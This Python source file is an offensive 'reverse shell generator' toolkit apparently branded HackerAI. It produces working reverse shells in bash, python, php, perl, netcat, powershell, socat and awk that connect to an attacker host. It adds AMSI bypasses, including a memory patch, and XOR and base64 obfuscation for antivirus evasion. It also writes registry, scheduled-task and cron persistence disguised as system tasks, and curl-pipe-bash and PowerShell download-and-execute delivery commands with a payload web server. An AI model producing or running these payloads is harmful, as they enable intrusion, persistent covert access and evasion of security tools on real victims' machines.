"""
Advanced Reverse Shell Generator v2.0
Enhanced with Interactive Handler, Evasion, Persistence, and Payload Delivery
"""
import base64
import urllib.parse
import socket
import threading
import time
import os
import random
import string
import hashlib
from config import *

class InteractiveHandler:
    """Interactive reverse shell handler with multi-session support"""
    
    def __init__(self, host='0.0.0.0', port=None):
        self.host = host
        self.port = port or LPORT
        self.active_connections = []
        self.is_running = False
        self.server_socket = None
        self.command_history = []
        
    def start_listener(self, background=False):
        """Start listener server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1)
            
            self.is_running = True
            
            print(f"{G}[+] Listening on {self.host}:{self.port}{W}")
            print(f"{C}[*] Waiting for connections...{W}")
            
            if background:
                listener_thread = threading.Thread(target=self._accept_connections)
                listener_thread.daemon = True
                listener_thread.start()
                return True
            else:
                self._accept_connections()
                
        except Exception as e:
            print(f"{R}[!] Failed to start listener: {e}{W}")
            return False
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                print(f"{G}[+] Connection from {client_address[0]}:{client_address[1]}{W}")
                
                # Create handler thread for this connection
                handler_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_address)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
                self.active_connections.append({
                    'socket': client_socket,
                    'address': client_address,
                    'thread': handler_thread
                })
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.is_running:
                    print(f"{R}[!] Accept error: {e}{W}")
                break
    
    def _handle_client(self, client_socket, client_address):
        """Handle individual client connection"""
        try:
            # Send welcome message
            welcome_msg = f"\n{G}[*] Connected to HackerAI Shell Handler{W}\n"
            welcome_msg += f"{C}[*] Session: {client_address[0]}:{client_address[1]}{W}\n"
            welcome_msg += f"{Y}[*] Type 'help' for available commands{W}\n\n"
            client_socket.send(welcome_msg.encode())
            
            # Main interactive loop
            while self.is_running and client_socket:
                try:
                    # Send prompt
                    prompt = f"{G}hackerai@{client_address[0]}:~# {W}"
                    client_socket.send(prompt.encode())
                    
                    # Receive command
                    command = client_socket.recv(1024).decode().strip()
                    
                    if not command:
                        continue
                    
                    self.command_history.append(command)
                    
                    # Handle special commands
                    if command.lower() == 'exit':
                        client_socket.send(f"{Y}[*] Closing connection{W}\n".encode())
                        break
                    elif command.lower() == 'help':
                        help_text = self._get_help_text()
                        client_socket.send(help_text.encode())
                    elif command.lower() == 'sessions':
                        sessions_text = self._list_sessions()
                        client_socket.send(sessions_text.encode())
                    elif command.lower() == 'background':
                        client_socket.send(f"{Y}[*] Backgrounding session...{W}\n".encode())
                        return
                    else:
                        # Execute command on target (simulated)
                        result = self._simulate_command(command, client_address)
                        client_socket.send(result.encode())
                        
                except Exception as e:
                    print(f"{R}[!] Client handler error: {e}{W}")
                    break
        
        except Exception as e:
            print(f"{R}[!] Connection error: {e}{W}")
        finally:
            client_socket.close()
            self._remove_connection(client_socket)
    
    def _simulate_command(self, command, client_address):
        """Simulate command execution on target"""
        # In real scenario, this would execute on the compromised system
        simulated_outputs = {
            'whoami': f"user\nuid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom)\n",
            'id': f"uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom)\n",
            'pwd': f"/home/user\n",
            'ls': f"Desktop  Documents  Downloads  Music  Pictures  Videos\n",
            'uname -a': f"Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n",
            'ifconfig': f"eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\n",
            'sudo -l': f"[sudo] password for user: \n",
        }
        
        if command in simulated_outputs:
            return simulated_outputs[command]
        else:
            return f"{Y}[*] Executing: {command}{W}\n{command}: command not found\n"
    
    def _get_help_text(self):
        """Get help text for shell"""
        help_text = f"""
{G}Available Commands:{W}
{C}  help            {W}- Show this help message
{C}  exit            {W}- Exit the shell
{C}  background      {W}- Background the session
{C}  sessions        {W}- List active sessions
{C}  whoami          {W}- Show current user
{C}  id              {W}- Show user ID and groups
{C}  pwd             {W}- Print working directory
{C}  ls              {W}- List directory contents
{C}  uname -a        {W}- Show system information
{C}  ifconfig        {W}- Show network interfaces
{C}  sudo -l         {W}- List sudo privileges
{C}  <any command>   {W}- Execute command on target

{Y}Note:{W} This is a simulated shell for demonstration.
      In real scenario, commands execute on compromised system.
"""
        return help_text
    
    def _list_sessions(self):
        """List active sessions"""
        if not self.active_connections:
            return f"{Y}[!] No active sessions{W}\n"
        
        sessions_text = f"\n{G}Active Sessions:{W}\n"
        sessions_text += f"{C}{'ID':<4} {'Address':<20} {'Status':<10}{W}\n"
        sessions_text += f"{C}{'-'*40}{W}\n"
        
        for i, conn in enumerate(self.active_connections, 1):
            sessions_text += f"{G}{i:<4} {str(conn['address'][0]):<20} {'Active':<10}{W}\n"
        
        return sessions_text + "\n"
    
    def _remove_connection(self, client_socket):
        """Remove connection from active list"""
        for conn in self.active_connections:
            if conn['socket'] == client_socket:
                self.active_connections.remove(conn)
                break
    
    def stop_listener(self):
        """Stop listener server"""
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()
        print(f"{Y}[*] Listener stopped{W}")

class PayloadEncryptor:
    """Payload encryption for antivirus evasion"""
    
    def __init__(self):
        self.encryption_methods = {
            'xor': self._xor_encrypt,
            'aes': self._aes_encrypt,
            'rc4': self._rc4_encrypt,
            'rot': self._rot_encrypt,
        }
    
    def _xor_encrypt(self, data, key=None):
        """XOR encryption"""
        if key is None:
            key = random.randint(1, 255)
        
        encrypted = []
        for char in data:
            encrypted.append(chr(ord(char) ^ key))
        
        return {
            'method': 'xor',
            'key': key,
            'payload': ''.join(encrypted),
            'decoder': f"""python -c "
data = '{''.join(encrypted)}'
key = {key}
exec(''.join(chr(ord(c) ^ key) for c in data))
" """
        }
    
    def _aes_encrypt(self, data, key=None):
        """AES encryption (simplified)"""
        if key is None:
            key = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        
        # Simple substitution for demonstration
        # In real scenario, use proper AES encryption
        import binascii
        encoded = base64.b64encode(data.encode()).decode()
        
        return {
            'method': 'aes',
            'key': key,
            'payload': encoded,
            'decoder': f"""python -c "
import base64
encoded = '{encoded}'
exec(base64.b64decode(encoded).decode())
" """
        }
    
    def _rc4_encrypt(self, data, key=None):
        """RC4 encryption (simplified)"""
        if key is None:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Simple substitution for demonstration
        hex_data = data.encode().hex()
        
        return {
            'method': 'rc4',
            'key': key,
            'payload': hex_data,
            'decoder': f"""python -c "
hex_data = '{hex_data}'
exec(bytes.fromhex(hex_data).decode())
" """
        }
    
    def _rot_encrypt(self, data, key=None):
        """ROT encryption"""
        if key is None:
            key = random.randint(1, 25)
        
        encrypted = []
        for char in data:
            if 'a' <= char <= 'z':
                encrypted.append(chr((ord(char) - ord('a') + key) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                encrypted.append(chr((ord(char) - ord('A') + key) % 26 + ord('A')))
            else:
                encrypted.append(char)
        
        return {
            'method': 'rot',
            'key': key,
            'payload': ''.join(encrypted),
            'decoder': f"""python -c "
data = '{''.join(encrypted)}'
key = {key}
result = []
for char in data:
    if 'a' <= char <= 'z':
        result.append(chr((ord(char) - ord('a') - key) % 26 + ord('a')))
    elif 'A' <= char <= 'z':
        result.append(chr((ord(char) - ord('A') - key) % 26 + ord('A')))
    else:
        result.append(char)
exec(''.join(result))
" """
        }
    
    def encrypt_payload(self, payload, method='xor', key=None):
        """Encrypt payload using specified method"""
        if method in self.encryption_methods:
            return self.encryption_methods[method](payload, key)
        return None

class WindowsEvasion:
    """Windows-specific evasion techniques"""
    
    @staticmethod
    def generate_amsi_bypass():
        """Generate AMSI bypass for Windows Defender"""
        amsi_bypasses = [
            # AMSI bypass 1
            """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""",
            
            # AMSI bypass 2
            """$A='System.Management.Automation.A';$B='ms';$C='Utils';$D=$A+$B+$C;$E=[Ref].Assembly.GetType($D);$F=$E.GetField('amsiInitFailed','NonPublic,Static');$F.SetValue($null,$true)""",
            
            # AMSI bypass 3 (Memory patch)
            """$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)"""
        ]
        
        return random.choice(amsi_bypasses)
    
    @staticmethod
    def generate_registry_persistence(payload, name="WindowsUpdate"):
        """Generate registry persistence script"""
        registry_paths = [
            f"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{name}",
            f"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\{name}",
            f"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{name}",
        ]
        
        registry_path = random.choice(registry_paths)
        
        persistence_script = f"""
# Add registry persistence
$RegPath = "{registry_path}"
$Payload = "{payload}"
New-ItemProperty -Path $RegPath -Name "{name}" -Value $Payload -PropertyType String -Force
"""
        
        return persistence_script
    
    @staticmethod
    def generate_schtasks_persistence(payload, task_name="SystemMaintenance"):
        """Generate scheduled task persistence"""
        schtasks_script = f"""
# Create scheduled task for persistence
$TaskName = "{task_name}"
$Payload = "{payload}"
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$Payload`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay "00:00:30"
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
"""
        
        return schtasks_script

class LinuxEvasion:
    """Linux-specific evasion techniques"""
    
    @staticmethod
    def generate_fileless_execution(payload):
        """Generate fileless execution script for /dev/shm"""
        fileless_script = f"""#!/bin/bash
# Fileless execution in shared memory
PAYLOAD='{payload}'
# Execute from memory
eval "$PAYLOAD"
# Alternative: Write to /dev/shm and execute
# echo "$PAYLOAD" > /dev/shm/.cache && chmod +x /dev/shm/.cache && /dev/shm/.cache
"""
        return fileless_script
    
    @staticmethod
    def generate_sudo_check(payload):
        """Generate script with sudo privilege check"""
        sudo_check_script = f"""#!/bin/bash
# Check for sudo privileges
if sudo -n true 2>/dev/null; then
    echo "[+] Sudo access available"
    # Execute with sudo if available
    sudo bash -c '{payload}'
else
    echo "[*] No sudo access, running as current user"
    {payload}
fi
"""
        return sudo_check_script
    
    @staticmethod
    def generate_cron_persistence(payload, job_name="syslog"):
        """Generate cron job persistence"""
        cron_script = f"""#!/bin/bash
# Add cron job for persistence
PAYLOAD='{payload}'
CRON_JOB="@reboot {payload}"
# Add to crontab
(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
echo "[+] Cron job added for persistence"
"""
        return cron_script

class PayloadDelivery:
    """Payload delivery methods"""
    
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.server_thread = None
        self.is_running = False
    
    def start_web_server(self, payload, background=True):
        """Start web server to deliver payload"""
        import http.server
        import socketserver
        
        # Create payload file
        payload_file = "payload.sh"
        with open(payload_file, 'w') as f:
            f.write(payload)
        
        # Create custom handler
        class PayloadHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    html = f"""
                    <html>
                    <body>
                    <h1>HackerAI Payload Server</h1>
                    <p>Payload available at: <a href="/{payload_file}">{payload_file}</a></p>
                    <p>One-liner: curl http://{self.server.server_address[0]}:{self.server.server_address[1]}/{payload_file} | bash</p>
                    </body>
                    </html>
                    """
                    self.wfile.write(html.encode())
                else:
                    super().do_GET()
        
        try:
            handler = PayloadHandler
            httpd = socketserver.TCPServer((self.host, self.port), handler)
            
            print(f"{G}[+] Web server started on http://{self.host}:{self.port}{W}")
            print(f"{C}[*] Payload URL: http://{self.host}:{self.port}/{payload_file}{W}")
            print(f"{Y}[*] One-liner: curl http://{self.host}:{self.port}/{payload_file} | bash{W}")
            
            if background:
                self.server_thread = threading.Thread(target=httpd.serve_forever)
                self.server_thread.daemon = True
                self.server_thread.start()
                self.is_running = True
            else:
                httpd.serve_forever()
                
            return True
            
        except Exception as e:
            print(f"{R}[!] Failed to start web server: {e}{W}")
            return False
    
    def generate_delivery_commands(self, payload, server_ip=None, server_port=None):
        """Generate various delivery commands"""
        if server_ip is None:
            server_ip = "YOUR_IP"
        if server_port is None:
            server_port = self.port
        
        delivery_methods = {
            'curl_bash': f"curl http://{server_ip}:{server_port}/payload.sh | bash",
            'wget_bash': f"wget -qO- http://{server_ip}:{server_port}/payload.sh | bash",
            'python_download': f"""python3 -c "import urllib.request; exec(urllib.request.urlopen('http://{server_ip}:{server_port}/payload.sh').read())" """,
            'powershell_download': f"""powershell -c "iex (New-Object Net.WebClient).DownloadString('http://{server_ip}:{server_port}/payload.ps1')" """,
            'nc_pipe': f"nc {server_ip} {server_port} | bash",
            'socat_exec': f"socat TCP:{server_ip}:{server_port} EXEC:bash",
        }
        
        return delivery_methods

class AdvancedReverseShellGenerator:
    def __init__(self, lhost=None, lport=None):
        self.lhost = lhost or LHOST
        self.lport = lport or LPORT
        self.encryptor = PayloadEncryptor()
        self.windows_evasion = WindowsEvasion()
        self.linux_evasion = LinuxEvasion()
        self.delivery = PayloadDelivery()
        self.handler = InteractiveHandler(self.lhost, self.lport)
        
    def generate_all(self):
        """Generate all shell types with enhancements"""
        shells = {
            # Basic shells
            "bash": self.generate_bash(),
            "python": self.generate_python(),
            "python3": self.generate_python3(),
            "php": self.generate_php(),
            "perl": self.generate_perl(),
            "nc": self.generate_nc(),
            "nc_openbsd": self.generate_nc_openbsd(),
            "powershell": self.generate_powershell(),
            "socat": self.generate_socat(),
            "awk": self.generate_awk(),
            
            # Windows enhanced
            "powershell_amsi": self.generate_powershell_amsi(),
            "powershell_encoded": self.generate_powershell_encoded(),
            
            # Linux enhanced
            "bash_fileless": self.generate_bash_fileless(),
            "bash_sudo": self.generate_bash_sudo(),
            
            # Encrypted
            "xor_encrypted": self.generate_xor_encrypted(),
            "base64_encoded": self.generate_base64_encoded(),
        }
        return shells
    
    def generate_bash(self):
        """Standard bash reverse shell"""
        return f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
    
    def generate_python(self):
        """Python reverse shell"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    
    def generate_python3(self):
        """Python3 reverse shell"""
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    
    def generate_php(self):
        """PHP reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    
    def generate_perl(self):
        """Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    
    def generate_nc(self):
        """Netcat reverse shell"""
        return f"nc -e /bin/sh {self.lhost} {self.lport}"
    
    def generate_nc_openbsd(self):
        """Netcat OpenBSD reverse shell"""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f"
    
    def generate_powershell(self):
        """PowerShell reverse shell"""
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$TCPClient = New-Object Net.Sockets.TCPClient('{self.lhost}', {self.lport});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);$StreamWriter.WriteLine('PS ' + (pwd).Path + '> ');$StreamWriter.Flush();$StreamReader = New-Object IO.StreamReader($NetworkStream);while($TCPClient.Connected){{$line = $StreamReader.ReadLine();if($line -eq 'exit'){{break;}};$output = try{{Invoke-Expression $line 2>&1 | Out-String}}catch{{$_ | Out-String}};$StreamWriter.WriteLine($output);$StreamWriter.WriteLine('PS ' + (pwd).Path + '> ');$StreamWriter.Flush();}}$StreamWriter.Close()" """
    
    def generate_socat(self):
        """Socat reverse shell"""
        return f"socat TCP:{self.lhost}:{self.lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
    
    def generate_awk(self):
        """AWK reverse shell"""
        return f"awk 'BEGIN {{s = \"/inet/tcp/0/{self.lhost}/{self.lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}' /dev/null"
    
    def generate_powershell_amsi(self):
        """PowerShell with AMSI bypass"""
        amsi_bypass = self.windows_evasion.generate_amsi_bypass()
        powershell = self.generate_powershell()
        
        return f"""
{amsi_bypass}
{powershell}
"""
    
    def generate_powershell_encoded(self):
        """Base64 encoded PowerShell"""
        powershell = self.generate_powershell()
        encoded = base64.b64encode(powershell.encode('utf-16le')).decode()
        
        return f"powershell -EncodedCommand {encoded}"
    
    def generate_bash_fileless(self):
        """Bash with fileless execution"""
        bash_shell = self.generate_bash()
        return self.linux_evasion.generate_fileless_execution(bash_shell)
    
    def generate_bash_sudo(self):
        """Bash with sudo check"""
        bash_shell = self.generate_bash()
        return self.linux_evasion.generate_sudo_check(bash_shell)
    
    def generate_xor_encrypted(self, method='xor'):
        """Generate XOR encrypted payload"""
        python_shell = self.generate_python()
        encrypted = self.encryptor.encrypt_payload(python_shell, method)
        
        if encrypted:
            return encrypted['decoder']
        return python_shell
    
    def generate_base64_encoded(self):
        """Generate base64 encoded payload"""
        python_shell = self.generate_python()
        encoded = base64.b64encode(python_shell.encode()).decode()
        
        return f"echo {encoded} | base64 -d | python"
    
    def generate_one_liner(self, shell_type):
        """Generate one-liner with various encoding"""
        shells = self.generate_all()
        if shell_type not in shells:
            return None
        
        shell = shells[shell_type]
        encoded_b64 = base64.b64encode(shell.encode()).decode()
        encoded_hex = shell.encode().hex()
        url_encoded = urllib.parse.quote(shell)
        
        one_liners = {
            "original": shell,
            "base64": f"echo {encoded_b64} | base64 -d | bash",
            "hex": f"echo {encoded_hex} | xxd -r -p | bash",
            "url_encoded": f"curl -s 'http://example.com/?cmd={url_encoded}' | bash",
        }
        
        return one_liners
    
    def start_interactive_handler(self, background=True):
        """Start interactive handler for reverse shells"""
        return self.handler.start_listener(background)
    
    def stop_interactive_handler(self):
        """Stop interactive handler"""
        self.handler.stop_listener()
    
    def generate_delivery_package(self, shell_type='bash', include_persistence=False):
        """Generate complete delivery package"""
        shells = self.generate_all()
        if shell_type not in shells:
            return None
        
        payload = shells[shell_type]
        package = {
            'payload': payload,
            'one_liners': self.generate_one_liner(shell_type),
            'delivery_commands': self.delivery.generate_delivery_commands(payload),
        }
        
        if include_persistence:
            if 'powershell' in shell_type:
                package['persistence'] = self.windows_evasion.generate_registry_persistence(payload)
            else:
                package['persistence'] = self.linux_evasion.generate_cron_persistence(payload)
        
        return package
    
    def create_web_delivery(self, shell_type='bash', port=8080):
        """Create web delivery server for payload"""
        shells = self.generate_all()
        if shell_type not in shells:
            return False
        
        payload = shells[shell_type]
        self.delivery.port = port
        return self.delivery.start_web_server(payload)

# Backward compatibility
class ReverseShellGenerator(AdvancedReverseShellGenerator):
    """Legacy wrapper for backward compatibility"""
    pass

# Example usage
if __name__ == "__main__":
    generator = AdvancedReverseShellGenerator("192.168.1.100", 4444)
    
    print(f"{G}[*] Generating advanced reverse shells...{W}")
    print(f"{C}[*] LHOST: {generator.lhost}, LPORT: {generator.lport}{W}")
    
    # Generate all shells
    shells = generator.generate_all()
    
    print(f"\n{Y}[+] Available Shell Types:{W}")
    for shell_type in shells.keys():
        print(f"  {C}• {shell_type}{W}")
    
    # Test one shell
    print(f"\n{Y}[+] Example Bash Shell:{W}")
    print(f"{G}{shells['bash']}{W}")
    
    # Start interactive handler (simulated)
    print(f"\n{Y}[*] Starting interactive handler (simulated)...{W}")
    print(f"{C}[*] Run: nc -nlvp {generator.lport}{W}")
    print(f"{C}[*] Then execute the shell on target{W}")